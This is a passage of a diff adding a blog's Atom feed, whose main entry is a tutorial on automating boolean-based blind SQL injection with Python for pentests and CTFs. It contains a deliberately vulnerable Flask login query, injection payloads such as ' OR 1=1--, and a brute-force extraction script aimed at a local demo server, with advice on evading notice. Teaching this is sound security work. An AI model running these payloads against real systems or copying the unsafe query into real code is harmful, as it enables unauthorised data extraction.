@@ -1,0 +1,1067 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://trebledj.me">
+  <title>TrebledJ&#39;s Pages</title>
+  <subtitle>TrebledJ&#39;s personal blog on programming, cybersecurity, music, and memes.</subtitle>
+  <link href="https://trebledj.me/feeds/project.xml" rel="self"/>
+  <link href="https://trebledj.me"/>
+  <updated>2024-08-10T00:00:00Z</updated>
+  <id>https://trebledj.me</id>
+  <author>
+    <name>TrebledJ</name>
+    <email>trebledjjj@gmail.com</email>
+  </author>
+  
+    
+      
+      <entry>
+        <title>Automating Boolean-Based SQL Injection with Python</title>
+        <description>How to be efficiently lazy at finding hidden gems in predictable places – Database Edition</description>
+        <link href="https://trebledj.me/posts/automating-boolean-sql-injection-with-python/"/>
+        <updated>2024-08-10T00:00:00Z</updated>
+        <id>https://trebledj.me/posts/automating-boolean-sql-injection-with-python/</id>
+        <content xml:lang="en" type="html">&lt;p&gt;When performing a penetration test, we occasionally come across SQL injection (SQLi) vulnerabilities. One particular class of SQLi is particularly tedious to exploit — Boolean-Based SQLi.&lt;/p&gt;
+&lt;p&gt;Tedious, heavily-repetitive tasks often present themselves as nice opportunities for automation. In this post, we’ll review Boolean-Based SQL Injection, and explore how to automate it with Python by starting with a basic script, optimising, applying multithreading, and more. We&#39;ll mainly focus on high-level approaches towards automation and keep our code snippets short.&lt;/p&gt;
+&lt;p&gt;The end result is a script which automates network requests and brute-forcing into a nice interface:&lt;/p&gt;
+&lt;div class=&quot;mb-2 rw center jw-100 video&quot;&gt;&lt;video autoplay=&quot;&quot; loop=&quot;&quot; muted=&quot;&quot; class=&quot;jw-100&quot;&gt;&lt;source src=&quot;https://trebledj.me/img/hkirc-ctf-2024-demo.mp4&quot; type=&quot;video/mp4&quot; /&gt;&lt;/video&gt;&lt;/div&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Demo of the Python script in a CTF challenge.&lt;/sup&gt;&lt;/p&gt;
+&lt;h2 id=&quot;what-is-boolean-based-blind-sql-injection&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#what-is-boolean-based-blind-sql-injection&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; What is Boolean-Based Blind SQL Injection?&lt;/h2&gt;
+&lt;p&gt;What a long name.&lt;/p&gt;
+&lt;p&gt;Let’s break it down from right to left:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;SQL Injection&lt;/strong&gt;: an SQL query is combined with a user payload which makes the resulting query behave differently, potentially resulting in sensitive information disclosure or remote code execution.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Blind&lt;/strong&gt;: SQL output is not returned directly in the response, but indirectly by some other indicator, such as a boolean response or time.
+&lt;ul&gt;
+&lt;li&gt;Sometimes, this term is dropped when discussing Boolean-Based SQLi, because Boolean-Based &lt;em&gt;implies&lt;/em&gt; Blind.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Boolean-Based&lt;/strong&gt;: the attacker crafts SQL queries that return a &lt;em&gt;TRUE&lt;/em&gt; or &lt;em&gt;FALSE&lt;/em&gt; response based on the injected conditions. This could appear as:
+&lt;ul&gt;
+&lt;li&gt;different status codes (e.g. 302 redirect on success, 401 on fail),&lt;/li&gt;
+&lt;li&gt;different response body (e.g. error messages, full search results), or&lt;/li&gt;
+&lt;li&gt;(rarely) different headers (e.g. Set-Cookie).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;By carefully analysing the application&#39;s response to these manipulated queries, we can extract data bit by bit, deduce the structure of the database, and potentially leak sensitive data.&lt;/p&gt;
+&lt;p&gt;Each &lt;abbr data-bs-placement=&quot;top&quot; data-bs-toggle=&quot;tooltip&quot; title=&quot;Database Management System (e.g. MySQL, Microsoft SQL Server, SQLite, PostgreSQL)&quot;&gt;DBMS&lt;/abbr&gt; has unique functions and grammar, so the SQLi syntax may be different. In MySQL, we can extract individual characters using the &lt;code&gt;SUBSTRING()&lt;/code&gt; function and convert them to numbers with &lt;code&gt;ASCII()&lt;/code&gt;.&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fn1&quot; id=&quot;fnref1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;By comparing the values with &lt;strong&gt;ASCII numbers&lt;/strong&gt;, we can determine the character stored.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;ASCII table.&quot; href=&quot;https://trebledj.me/img/asciifull-715w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-80&quot; src=&quot;https://trebledj.me/img/asciifull-715w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 715 / 488&quot; alt=&quot;ASCII table.&quot; title=&quot;ASCII table.&quot; srcset=&quot;https://trebledj.me/img/asciifull-256w.webp 256w, https://trebledj.me/img/asciifull-512w.webp 512w, https://trebledj.me/img/asciifull-715w.webp 715w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 715px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;details&gt;&lt;summary&gt;Simple SQLi Example&lt;/summary&gt;&lt;div class=&quot;details-content&quot;&gt;
+&lt;p&gt;So what does this look like practically?&lt;/p&gt;
+&lt;p&gt;Here we have a simple Flask server with an in-memory SQLite database containing a &lt;code&gt;login&lt;/code&gt; endpoint. The &lt;code&gt;login()&lt;/code&gt; function is simple: check if the username and password exists in the DB. If it exists, then login is successful.&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fn2&quot; id=&quot;fnref2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-label=&quot;server.py&quot; data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;route&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;/login&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; methods&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;POST&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    username &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;form&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+    password &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;form&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;# Check if username/password exists.&lt;/span&gt;
+    query &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;SELECT * FROM users WHERE username=&#39;{}&#39; AND password=&#39;{}&#39;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; conn&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cursor&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;execute&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;query&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    user &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fetchone&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; user&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Login successful!&#39;&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Login failed.&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;span&gt;server.py&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This is vulnerable to SQL injection, since the &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; parameters are formatted into the query without any sanitisation and without using prepared statements. But this is &lt;em&gt;blind&lt;/em&gt; SQLi, because the results are not returned, only &amp;quot;Login successful&amp;quot; or &amp;quot;Login failed&amp;quot;.&lt;/p&gt;
+&lt;p&gt;To exploit this, we start by crafting a proof-of-concept. We&#39;ll pass &lt;code&gt;&#39; OR 1=1-- &lt;/code&gt; to the &lt;code&gt;username&lt;/code&gt; parameter, transforming the query into:&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre class=&quot;language-sql&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; users &lt;span class=&quot;token keyword&quot;&gt;WHERE&lt;/span&gt; username&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;-- &#39; AND password=&#39;...&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;span class=&quot;lang&quot;&gt;SQL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;where everything after &lt;code&gt;--&lt;/code&gt; is treated as a comment.&lt;/p&gt;
+&lt;p&gt;Since &lt;code&gt;1=1&lt;/code&gt; is always true, all users will be selected, and the page returns: &amp;quot;Login successful&amp;quot;.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Basic Proof-of-Concept showing a TRUE/FALSE response from our demo server.&quot; href=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/login-success-1200w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-100 &quot; src=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/login-success-1200w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1200 / 180&quot; alt=&quot;Basic Proof-of-Concept showing a TRUE/FALSE response from our demo server.&quot; title=&quot;Basic Proof-of-Concept showing a TRUE/FALSE response from our demo server.&quot; srcset=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/login-success-256w.webp 256w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/login-success-512w.webp 512w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/login-success-1024w.webp 1024w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/login-success-1200w.webp 1200w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1200px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Using this, we can detect &lt;em&gt;TRUE&lt;/em&gt; responses by checking if the body contains &amp;quot;success&amp;quot;.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Great success!&quot; href=&quot;https://trebledj.me/img/960x0-959w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-60&quot; src=&quot;https://trebledj.me/img/960x0-959w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 959 / 759&quot; alt=&quot;Great success!&quot; title=&quot;Great success!&quot; srcset=&quot;https://trebledj.me/img/960x0-256w.webp 256w, https://trebledj.me/img/960x0-512w.webp 512w, https://trebledj.me/img/960x0-959w.webp 959w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 959px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Moreover, we can leak further information by changing &lt;code&gt;1=1&lt;/code&gt; to other guessy queries. For instance, we can use this bad boy — &lt;code&gt;UNICODE(SUBSTRING(sqlite_version(), 1, 1))=51&lt;/code&gt; — to test if the first character of &lt;code&gt;sqlite_version()&lt;/code&gt; is &lt;code&gt;&#39;3&#39;&lt;/code&gt;. This is where the tedious part comes in: we need to scan two variables: the index and the ASCII character. Scripting helps eliminate this manual labour.&lt;/p&gt;
+&lt;p&gt;We can use this simple script to brute-force the remaining characters:&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; requests
+
+&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;check_sql_value&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sql_query&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; idx&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; guess&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;http://127.0.0.1:5000/login&#39;&lt;/span&gt;
+    data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token string&quot;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token string&quot;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;&#39; OR UNICODE(SUBSTRING(&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;sql_query&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;idx&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;, 1)) = &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;guess&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt; -- &quot;&lt;/span&gt;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+    r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; requests&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;post&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;success&#39;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text
+
+max_data_len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt;
+final_data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&#39;&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;# SQL&#39;s SUBSTRING uses 1-based indexing.&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; idx &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; max_data_len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; guess &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; check_sql_value&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;sqlite_version()&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; idx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; guess&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            final_data &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;guess&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;final_data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;# No valid ASCII chars found. Probably end of string.&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Output:&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;We successfully determined the SQLite Version: 3.41.2.&quot; href=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/brute-sqlite-version-638w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-70&quot; src=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/brute-sqlite-version-638w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 638 / 214&quot; alt=&quot;We successfully determined the SQLite Version: 3.41.2.&quot; title=&quot;We successfully determined the SQLite Version: 3.41.2.&quot; srcset=&quot;https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/brute-sqlite-version-256w.webp 256w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/brute-sqlite-version-512w.webp 512w, https://trebledj.me/img/posts/infosec/automating-boolean-sqli/assets/brute-sqlite-version-638w.webp 638w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 638px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;details-collapse-bottom&quot;&gt;&lt;sub&gt;&lt;a class=&quot;details-collapse-button&quot;&gt;(collapse)&lt;/a&gt;&lt;/sub&gt;&lt;/div&gt;&lt;/div&gt;&lt;/details&gt;
+&lt;h2 id=&quot;optimisations-with-binary-search&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#optimisations-with-binary-search&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Optimisations with Binary Search&lt;/h2&gt;
+&lt;p&gt;One quick and simple optimisation whenever we’re searching an ordered sequence is to apply binary search. This drastically reduces the max number of requests for each character from 96 to 7.&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fn3&quot; id=&quot;fnref3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;This is a good thing for real life engagements: fewer iterations → less traffic → more sneaky → better opsec.&lt;/p&gt;
+&lt;p&gt;Normally, binary search relies on three possible outputs for a test: &lt;code&gt;=&lt;/code&gt;, &lt;code&gt;&amp;lt;&lt;/code&gt;, and &lt;code&gt;&amp;gt;&lt;/code&gt;. But it is possible to make do with just two possible outputs: &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;=&lt;/code&gt;. If it’s less, we eliminate the upper half; otherwise, we eliminate the lower half.&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;binary_search&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;val&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; low&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; high&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token triple-quoted-string string&quot;&gt;&quot;&quot;&quot;Binary search for value between low (inclusive) and high (exclusive),
+    assuming the guessed value is within range.&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; low &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; high&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        mid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;low &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; high&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; low &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; mid&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; mid &lt;span class=&quot;token comment&quot;&gt;# Found val.&lt;/span&gt;
+        
+        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&#39;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;low&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token format-spec&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt; - &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;high&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token format-spec&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#92;tGuess: &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;mid&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token format-spec&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token 